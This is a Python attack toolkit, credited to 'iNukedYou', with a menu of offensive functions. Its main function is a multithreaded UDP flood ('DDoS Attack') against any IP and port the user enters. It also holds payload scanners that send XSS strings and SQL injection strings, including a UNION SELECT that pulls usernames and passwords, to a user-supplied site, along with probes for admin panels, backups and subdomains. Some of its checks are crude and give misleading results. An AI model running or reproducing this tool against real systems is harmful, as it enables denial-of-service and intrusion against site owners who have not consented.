import threading
import socket
import requests
import random
import sys
import time
import json
from colorama import Fore, Style, init

init(autoreset=True)

def banner():
    print(Fore.RED + Style.BRIGHT + """
███████╗██╗   ██╗██╗███████╗██████╗ ███████╗██╗   ██╗████████╗
██╔════╝██║   ██║██║██╔════╝██╔══██╗██╔════╝██║   ██║╚══██╔══╝
█████╗  ██║   ██║██║█████╗  ██████╔╝█████╗  ██║   ██║   ██║   
██╔══╝  ██║   ██║██║██╔══╝  ██╔══██╗██╔══╝  ██║   ██║   ██║   
███████╗╚██████╔╝██║███████╗██║  ██║███████╗╚██████╔╝   ██║   
╚══════╝ ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝    ╚═╝   
""")
    print(Fore.YELLOW + "     Made by iNukedYou\n     v0.1\n     Contact: iNukedYou on Discord\n" + Fore.RED + "-"*50)

def ddos_attack():
    target = input(Fore.CYAN + "Enter target IP/Domain: ").strip()
    port = int(input(Fore.CYAN + "Enter target port: ").strip())
    num_packets = int(input(Fore.CYAN + "Enter number of packets: ").strip())
    print(Fore.GREEN + f"Attacking {target} on port {port}. Sending {num_packets} packets.")

    def send_packet():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_to_send = random._urandom(1024)
        sent_packets = 0
        while sent_packets < num_packets:
            sock.sendto(bytes_to_send, (target, port))
            sent_packets += 1
            if sent_packets % 1000 == 0:
                print(Fore.YELLOW + f"{sent_packets} packets sent to {target} on port {port}...")
            time.sleep(0.01)

    try:
        while True:
            threading.Thread(target=send_packet, daemon=True).start()
    except KeyboardInterrupt:
        print(Fore.RED + "\nAttack stopped.")

def xss_scan():
    url = input(Fore.CYAN + "Enter target domain (e.g., https://example.com): ").strip()
    payloads = [
        "<script>alert(1)</script>", "'><script>alert(1)</script>",
        '" onmouseover="alert(1)"', '<img src="x" onerror="alert(1)">', 
        "<img src='x' onerror=confirm(1)>", "<svg/onload=alert(1)>"
    ]

    for payload in payloads:
        response = requests.get(url + payload)
        if payload in response.text:
            print(Fore.GREEN + f"Possible XSS found with payload: {payload}")
        else:
            print(Fore.RED + f"No XSS found with payload: {payload}")

def sql_injection_scan():
    url = input(Fore.CYAN + "Enter target domain (e.g., https://example.com): ").strip()
    payloads = [
        "'", "' OR '1'='1", '" OR "1"="1', "') OR ('1'='1",
        "' UNION SELECT null, username, password FROM users--", 
        "' AND 1=1--"
    ]

    for payload in payloads:
        response = requests.get(url + "?id=" + payload)
        if "error" in response.text.lower():
            print(Fore.GREEN + f"Possible SQL Injection found with payload: {payload}")
        else:
            print(Fore.RED + f"No SQL Injection found with payload: {payload}")

def cms_scan():
    url = input(Fore.CYAN + "Enter target domain (e.g., https://example.com): ").strip()
    cms_signatures = {
        'WordPress': '/wp-login.php', 'Joomla': '/administrator', 
        'Drupal': '/user/login', 'Magento': '/admin', 'Wix': '/login'
    }

    for cms, path in cms_signatures.items():
        response = requests.get(url + path)
        if response.status_code == 200:
            print(Fore.GREEN + f"{cms} login page found: {url + path}")
        else:
            print(Fore.RED + f"No {cms} found at: {url + path}")

def subdomain_scan():
    domain = input(Fore.CYAN + "Enter domain (e.g., example.com): ").strip()
    subdomains = ["www", "mail", "blog", "dev", "test", "api", "shop", "admin", "panel", "intranet"]
    
    for sub in subdomains:
        full_url = f"http://{sub}.{domain}"
        try:
            response = requests.get(full_url)
            if response.status_code == 200:
                print(Fore.GREEN + f"Active subdomain found: {full_url}")
        except:
            continue

def dir_scan():
    url = input(Fore.CYAN + "Enter target domain (e.g., https://example.com): ").strip()
    paths = ["/admin", "/login", "/config", "/backup", "/hidden", "/uploads", "/dashboard", "/api", "/images", "/files", "/docs", "/files/upload"]

    for path in paths:
        full_url = url + path
        try:
            response = requests.get(full_url)
            if response.status_code == 200:
                print(Fore.GREEN + f"Found: {full_url}")
            elif response.status_code == 403:
                print(Fore.YELLOW + f"Access Denied (403): {full_url}")
            else:
                continue
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"Error accessing {full_url}: {str(e)}")

def web_osint():
    url = input(Fore.CYAN + "Enter target domain (e.g., https://example.com): ").strip()
    response = requests.get(url)
    print(Fore.YELLOW + f"\nHeaders for {url}:")
    for key, value in response.headers.items():
        print(Fore.GREEN + f"{key}: {value}")

def api_security_scan():
    url = input(Fore.CYAN + "Enter API URL (e.g., https://api.example.com): ").strip()
    response = requests.get(url)
    
    if "Access-Control-Allow-Origin" not in response.headers:
        print(Fore.RED + "Potential CORS misconfiguration detected!")
    else:
        print(Fore.GREEN + "CORS headers seem properly configured.")

def all_in_one_scan():
    print(Fore.MAGENTA + "Running all scans...")
    xss_scan()
    sql_injection_scan()
    cms_scan()
    subdomain_scan()
    dir_scan()
    web_osint()
    api_security_scan()

def main_menu():
    banner()
    print(Fore.YELLOW + "\nSelect an option:")
    print(Fore.GREEN + "1. DDoS Attack")
    print(Fore.GREEN + "2. XSS Scan")
    print(Fore.GREEN + "3. SQL Injection Scan")
    print(Fore.GREEN + "4. CMS Scan")
    print(Fore.GREEN + "5. Subdomain Scan")
    print(Fore.GREEN + "6. Directory Scan")
    print(Fore.GREEN + "7. Web OSINT")
    print(Fore.GREEN + "8. API Security Scan")
    print(Fore.GREEN + "9. Run All Scans")
    print(Fore.RED + "0. Exit")

    choice = input(Fore.YELLOW + "Enter choice: ").strip()

    if choice == "1":
        ddos_attack()
    elif choice == "2":
        xss_scan()
    elif choice == "3":
        sql_injection_scan()
    elif choice == "4":
        cms_scan()
    elif choice == "5":
        subdomain_scan()
    elif choice == "6":
        dir_scan()
    elif choice == "7":
        web_osint()
    elif choice == "8":
        api_security_scan()
    elif choice == "9":
        all_in_one_scan()
    elif choice == "0":
        sys.exit(0)
    else:
        print(Fore.RED + "Invalid option.")
        main_menu()

if __name__ == "__main__":
    main_menu()
